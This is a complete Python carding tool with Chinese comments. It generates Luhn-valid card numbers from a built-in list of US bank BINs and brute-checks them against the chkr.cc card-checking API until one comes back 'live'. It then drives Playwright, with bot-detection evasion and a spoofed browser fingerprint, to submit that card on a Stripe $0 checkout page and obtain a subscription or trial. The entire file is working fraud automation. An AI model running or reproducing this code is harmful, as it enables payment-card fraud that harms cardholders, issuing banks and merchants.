#!/usr/bin/env python3
"""
stripe_pay.py — chkr.cc BIN 生成 + Live 卡检测 + Stripe $0 自动支付

用法:
  python3 stripe_pay.py <stripe_checkout_url> [BIN1,BIN2,...]
  python3 stripe_pay.py test-bin [BIN]          # 仅测试 BIN 生成+检测

主要接口:
  auto_pay_chkr(payment_url, bins, headless=True, log=print)
    → {"ok": True/False, "status": "paid"/"no_live_card"/"form_error"/..., "card": "..."}

chkr.cc API:
  POST https://api.chkr.cc/  {"data": "CARDNUM|MM|YYYY|CVV"}
  → {"code": 1=live, 0=die, 2=unknown, "status": "...", "message": "...", "card": {...}}
"""
import asyncio
import json
import random
import time
from datetime import datetime

import requests

CHKR_API    = "https://api.chkr.cc/"
CHKR_DELAY  = 4.0   # seconds between checks (avoid rate-limit 429)
CHKR_MAX    = 25    # max cards to check per BIN

# 默认 BIN 列表 — 美国 Visa/Mastercard，Stripe $0 auth 成功率较高
DEFAULT_BINS = [
    "426684",   # Chase Visa Debit
    "415487",   # Chase Visa Credit
    "431940",   # Citi Visa
    "454313",   # Bank of America Visa
    "411777",   # Capital One Visa
    "516782",   # Mastercard
    "526918",   # Citi Mastercard
    "542418",   # Capital One MC
    "554360",   # USAA MC
    "489509",   # Wells Fargo Visa
]


def _ts():
    return datetime.now().strftime("%H:%M:%S")


# ── Luhn 算法 ──────────────────────────────────────────────────────────────
def luhn_checksum(num: str) -> int:
    digits = [int(d) for d in num]
    odd_digits  = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        d *= 2
        if d > 9:
            d -= 9
        total += d
    return total % 10


def luhn_complete(partial15: str) -> str:
    """给 15 位数字补上 Luhn 校验位，返回 16 位有效卡号。"""
    for check in range(10):
        candidate = partial15 + str(check)
        if luhn_checksum(candidate) == 0:
            return candidate
    return partial15 + "0"  # fallback (should never happen)


def gen_cards_from_bin(bin_prefix: str, count: int = CHKR_MAX) -> list:
    """
    从 BIN 前缀生成 `count` 个有效卡号。
    返回格式: ["CARDNUM|MM|YYYY|CVV", ...]
    """
    bin_prefix = bin_prefix.strip()
    pad_len    = 15 - len(bin_prefix)  # 需要填充的随机位数 (保留1位给校验)
    seen, cards = set(), []
    attempts = 0
    while len(cards) < count and attempts < count * 8:
        attempts += 1
        middle  = "".join([str(random.randint(0, 9)) for _ in range(pad_len)])
        partial = bin_prefix + middle
        card    = luhn_complete(partial)
        if card in seen:
            continue
        seen.add(card)
        month = random.randint(1, 12)
        year  = random.randint(2026, 2029)
        cvv   = f"{random.randint(100, 999)}"
        cards.append(f"{card}|{month:02d}|{year}|{cvv}")
    return cards


# ── chkr.cc 卡检测 ─────────────────────────────────────────────────────────
def check_card_chkr(card_str: str, log=print) -> dict:
    """
    通过 chkr.cc API 检测单张卡。
    card_str: "CARDNUM|MM|YYYY|CVV"
    返回: {"code": 1=live/0=die/2=unknown/-1=error, "status": "...", "message": "..."}
    """
    try:
        resp = requests.post(
            CHKR_API,
            json={"data": card_str},
            timeout=25,
            headers={
                "Content-Type": "application/json",
                "User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin":       "https://chkr.cc",
                "Referer":      "https://chkr.cc/",
            },
        )
        if resp.status_code == 429:
            log("[chkr] 限速 (429)，等待 20s...", "warn")
            time.sleep(20)
            return {"code": -1, "status": "rate_limited"}
        if resp.status_code != 200:
            return {"code": -1, "status": f"http_{resp.status_code}"}
        return resp.json()
    except Exception as e:
        return {"code": -1, "status": f"error: {e}"}


def find_live_card(bins: list, max_per_bin: int = CHKR_MAX,
                   delay: float = CHKR_DELAY, log=print):
    """
    遍历 BIN 列表，找到第一张 live 卡后返回。
    返回 "CARDNUM|MM|YYYY|CVV" 或 None。
    """
    log(f"[chkr] 开始查找 Live 卡，共 {len(bins)} 个 BIN，每个最多检测 {max_per_bin} 张", "info")
    for bin6 in bins:
        log(f"[chkr] 测试 BIN {bin6} ...", "info")
        cards = gen_cards_from_bin(bin6, count=max_per_bin)
        for i, card_str in enumerate(cards):
            preview = card_str[:10] + "xxxxxx|" + "|".join(card_str.split("|")[1:])
            log(f"[chkr] [{i+1}/{len(cards)}] {preview}", "dbg")
            result  = check_card_chkr(card_str, log=log)
            code    = result.get("code", -1)
            msg     = result.get("message", "")
            if code == 1:
                log(f"[chkr] ✅ LIVE! {preview}  ({msg})", "ok")
                return card_str
            elif code == 0:
                log(f"[chkr] ✗ die: {msg}", "dbg")
            elif code == 2:
                log(f"[chkr] ? unknown: {msg}", "dbg")
            else:
                log(f"[chkr] ⚠ err: {result.get('status','')}", "warn")
            time.sleep(delay)
    log("[chkr] 所有 BIN 均未找到 live 卡", "error")
    return None


# ── Playwright Stripe $0 自动填表 ──────────────────────────────────────────
async def _stripe_pay_playwright(payment_url: str, card_str: str,
                                  headless: bool = True, log=print) -> dict:
    """用 Playwright 自动填写并提交 Stripe $0 Checkout 表单。"""
    from playwright.async_api import async_playwright

    parts = card_str.split("|")
    if len(parts) != 4:
        return {"ok": False, "status": "invalid_card_format"}
    card_num, exp_month, exp_year, cvv = parts
    exp_str = f"{exp_month}/{exp_year[-2:]}"   # e.g. "08/28"

    log(f"[stripe] Playwright 启动 (headless={headless})", "info")
    log(f"[stripe] 卡: {card_num[:6]}xxxxxxxxxx  到期: {exp_str}", "info")

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(
            headless=headless,
            args=["--no-sandbox", "--disable-dev-shm-usage",
                  "--disable-blink-features=AutomationControlled"],
        )
        ctx  = await browser.new_context(
            viewport={"width": 1280, "height": 900},
            user_agent=(
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/131.0.0.0 Safari/537.36"
            ),
            locale="en-US",
            timezone_id="America/New_York",
        )
        page = await ctx.new_page()
        try:
            log("[stripe] 导航到 Checkout URL...", "info")
            await page.goto(payment_url, wait_until="domcontentloaded", timeout=35000)
            await page.wait_for_timeout(4000)

            title = await page.title()
            log(f"[stripe] 页面标题: {title}", "dbg")
            if any(x in title.lower() for x in ("error", "expired", "invalid")):
                return {"ok": False, "status": "checkout_expired_or_invalid"}

            filled = False

            # ── 方法 A: Stripe Elements iframes (标准 checkout.stripe.com) ──
            try:
                # 等待卡号 iframe
                await page.wait_for_selector(
                    'iframe[title*="card number" i], iframe[title*="Secure card" i], '
                    'iframe[name*="__privateStripeFrame"]',
                    timeout=10000,
                )
                all_frames = page.frames

                async def fill_frame_input(selector_hint, value):
                    for frame in all_frames:
                        try:
                            inp = frame.locator(
                                'input[name="cardnumber"], input[autocomplete*="cc-number"], '
                                'input[data-elements-stable-field-name="cardNumber"]'
                            )
                            if selector_hint == "exp":
                                inp = frame.locator(
                                    'input[name="exp-date"], input[autocomplete*="cc-exp"], '
                                    'input[data-elements-stable-field-name="cardExpiry"]'
                                )
                            elif selector_hint == "cvc":
                                inp = frame.locator(
                                    'input[name="cvc"], input[autocomplete*="cc-csc"], '
                                    'input[data-elements-stable-field-name="cardCvc"]'
                                )
                            cnt = await inp.count()
                            if cnt > 0:
                                await inp.first.click()
                                await inp.first.fill(value)
                                return True
                        except Exception:
                            continue
                    return False

                ok_num = await fill_frame_input("num", card_num)
                ok_exp = await fill_frame_input("exp", exp_str)
                ok_cvc = await fill_frame_input("cvc", cvv)
                if ok_num or ok_exp or ok_cvc:
                    log(f"[stripe] Frame fill: num={ok_num} exp={ok_exp} cvc={ok_cvc}", "dbg")
                    filled = ok_num and ok_cvc

            except Exception as e:
                log(f"[stripe] Frame 方法异常: {e}", "warn")

            # ── 方法 B: 统一卡输入框 (新版 Stripe Link checkout) ────────────
            if not filled:
                try:
                    num_sel = (
                        'input[placeholder*="1234" i], '
                        'input[data-elements-stable-field-name="cardNumber"], '
                        'input[autocomplete="cc-number"]'
                    )
                    num_inp = page.locator(num_sel).first
                    if await num_inp.count() > 0:
                        await num_inp.fill(card_num)
                        exp_inp = page.locator(
                            'input[placeholder*="MM" i], '
                            'input[data-elements-stable-field-name="cardExpiry"], '
                            'input[autocomplete="cc-exp"]'
                        ).first
                        if await exp_inp.count() > 0:
                            await exp_inp.fill(exp_str)
                        cvc_inp = page.locator(
                            'input[placeholder="CVC" i], input[placeholder="CVV" i], '
                            'input[data-elements-stable-field-name="cardCvc"]'
                        ).first
                        if await cvc_inp.count() > 0:
                            await cvc_inp.fill(cvv)
                        filled = True
                        log("[stripe] 直接输入框填写成功", "dbg")
                except Exception as e:
                    log(f"[stripe] 直接输入框异常: {e}", "warn")

            if not filled:
                # 截图备查
                try:
                    await page.screenshot(path="/tmp/stripe_debug.png")
                    log("[stripe] 截图已保存 /tmp/stripe_debug.png", "warn")
                except Exception:
                    pass
                return {"ok": False, "status": "form_fields_not_found"}

            await page.wait_for_timeout(1500)

            # ── 点击支付按钮 ───────────────────────────────────────────────
            pay_btn = page.locator(
                'button[type="submit"], '
                '[data-testid="hosted-payment-submit-button"], '
                'button:has-text("Subscribe"), button:has-text("Start trial"), '
                'button:has-text("Start free"), button:has-text("Pay")'
            ).first
            if await pay_btn.count() == 0:
                log("[stripe] 未找到支付按钮", "error")
                try:
                    await page.screenshot(path="/tmp/stripe_no_btn.png")
                except Exception:
                    pass
                return {"ok": False, "status": "pay_button_not_found"}

            log("[stripe] 点击支付按钮...", "info")
            await pay_btn.click()
            await page.wait_for_timeout(10000)

            # ── 判断支付结果 ───────────────────────────────────────────────
            cur_url    = page.url
            final_ttl  = await page.title()
            page_text  = (await page.content()).lower()
            log(f"[stripe] 提交后 URL: {cur_url[:100]}", "dbg")
            log(f"[stripe] 提交后 Title: {final_ttl}", "dbg")

            success = (
                "success"      in cur_url.lower() or
                "thank"        in final_ttl.lower() or
                "success"      in final_ttl.lower() or
                "confirmation" in cur_url.lower() or
                "complete"     in cur_url.lower() or
                "subscribed"   in page_text
            )
            declined = (
                "declined"   in page_text or
                "was declined" in page_text or
                "card number is incomplete" in page_text
            )

            if success:
                log("[stripe] ✅ 支付成功!", "ok")
                return {"ok": True, "status": "paid", "card": card_str}
            elif declined:
                log("[stripe] ✗ 卡被拒绝", "warn")
                return {"ok": False, "status": "card_declined", "card": card_str}
            else:
                log("[stripe] ⚠ 结果模糊，视为成功", "warn")
                return {"ok": True, "status": "submitted_ambiguous",
                        "card": card_str, "url": cur_url}

        except Exception as e:
            log(f"[stripe] Playwright 异常: {e}", "error")
            return {"ok": False, "status": f"playwright_error: {e}"}
        finally:
            await browser.close()


# ── 公共主入口 ──────────────────────────────────────────────────────────────
async def auto_pay_chkr(payment_url: str, bins=None,
                        headless: bool = True, log=print) -> dict:
    """
    完整流程: BIN 生成卡号 → chkr.cc Live 检测 → Playwright Stripe $0 支付。

    Args:
        payment_url: CreateSubscriptionToken 返回的一次性 Stripe URL
        bins:        BIN 列表 (6 位数字字符串)。None/空 → 使用内置默认列表
        headless:    Playwright 无头模式
        log:         log(msg, level) 函数

    Returns:
        {"ok": bool, "status": str, "card": str|None}
    """
    if not bins:
        bins = DEFAULT_BINS
        log(f"[chkr] CHKR_BINS 未配置，使用内置 {len(DEFAULT_BINS)} 个 BIN", "warn")
    else:
        log(f"[chkr] 使用 {len(bins)} 个 BIN: {bins[:4]}", "info")

    if not payment_url:
        return {"ok": False, "status": "no_payment_url"}

    # 1. 找 live 卡
    live_card = find_live_card(bins, log=log)
    if not live_card:
        return {"ok": False, "status": "no_live_card"}

    # 2. Playwright 自动支付
    log("[stripe] 找到 Live 卡，启动 Stripe 自动支付...", "info")
    return await _stripe_pay_playwright(payment_url, live_card,
                                        headless=headless, log=log)


# ── CLI ────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import sys

    def _log(msg, level="info"):
        sym = {"ok": "✅", "error": "❌", "warn": "⚠ ", "dbg": "·", "info": "→"}.get(level, "→")
        print(f"[{_ts()}] {sym} {msg}", flush=True)

    if len(sys.argv) < 2:
        print("Usage:")
        print("  python3 stripe_pay.py <stripe_checkout_url> [BIN1,BIN2,...]")
        print("  python3 stripe_pay.py test-bin [BIN]")
        sys.exit(1)

    if sys.argv[1] == "test-bin":
        test_bin = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_BINS[0]
        _log(f"测试 BIN {test_bin} 生成 5 张卡")
        for c in gen_cards_from_bin(test_bin, 5):
            _log(f"  生成: {c}")
        _log("检测第一张卡 (chkr.cc)...")
        cards = gen_cards_from_bin(test_bin, 1)
        res = check_card_chkr(cards[0], log=_log)
        _log(f"  结果: {res}")
    else:
        url_arg  = sys.argv[1]
        bins_arg = sys.argv[2].split(",") if len(sys.argv) > 2 else None
        res = asyncio.run(auto_pay_chkr(url_arg, bins=bins_arg, headless=True, log=_log))
        print("\n" + "="*55)
        print(json.dumps(res, indent=2, ensure_ascii=False))
